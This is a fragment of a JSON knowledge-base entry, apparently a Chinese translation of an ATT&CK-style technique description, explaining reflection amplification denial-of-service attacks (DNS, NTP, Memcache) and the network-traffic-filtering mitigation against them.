          "content": "反射攻击通常利用比请求更大的响应协议来扩大其流量，通常称为反射放大攻击。对手可能能够产生攻击流量量的增加，这比发送给放大器的请求要大几个数量级。这种增加的程度将取决于许多变量，例如所讨论的协议，所使用的技术以及实际产生攻击量扩增的放大服务器。启用反射放大洪水的两个突出的协议是DNS和NTP，尽管已经记录了其他几个野外的使用。特别是，Memcache协议表明自己是一个强大的协议，放大尺寸高达请求数据包的51,200倍。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1037",
        "name": "过滤网络流量",
        "description": [
          [
            {
              "type": "text",
              "content": "当洪水量超过目标网络连接的能力时，通常有必要拦截上游传入的流量以从合法流量中滤除攻击流量。可以由托管Internet服务提供商（ISP）或第三方（例如内容交付网络（CDN））或专门从事DOS缓解的提供商提供此类防御。"
            }
          ],
          [
            {
              "type": "text",
              "content": "根据洪水量的不同，可以通过阻止源地址来采购攻击，阻止目标的端口或阻止用于运输的协议来实现本地过滤。"
            }
          ],
          [
            {
              "type": "text",
              "content": "由于立即做出反应可能需要第三方的快速参与，因此分析与受网络DOS攻击影响的关键资源相关的风险，并制定灾难恢复计划/业务连续性计划以应对事件。"
            }
          ]
        ]
      }
    ]
  }
]
